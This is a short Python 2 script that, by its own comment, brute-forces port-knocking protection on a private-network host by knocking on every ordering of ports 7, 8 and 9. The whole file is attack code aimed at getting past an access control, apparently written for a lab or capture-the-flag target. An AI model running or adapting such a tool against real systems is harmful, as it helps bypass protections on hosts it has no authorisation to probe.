#!/usr/bin/python

# bruteforcing port knocking protection by trying all possible combinations

import itertools
import socket
import time 
import sys

server = "192.168.179.1"

test = itertools.permutations([7,8,9])
for targets in test:
	for port in targets:
		try:
			message = "\r[*]knocking : %s " % (str(port))
			sys.stdout.write(message)
			sys.stdout.flush()
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(0.5)
			s.connect((server, int(port)))			
			s.recv(1024)
			s.close()
			
			time.sleep(60)
		except Exception,e:
			print e
			pass
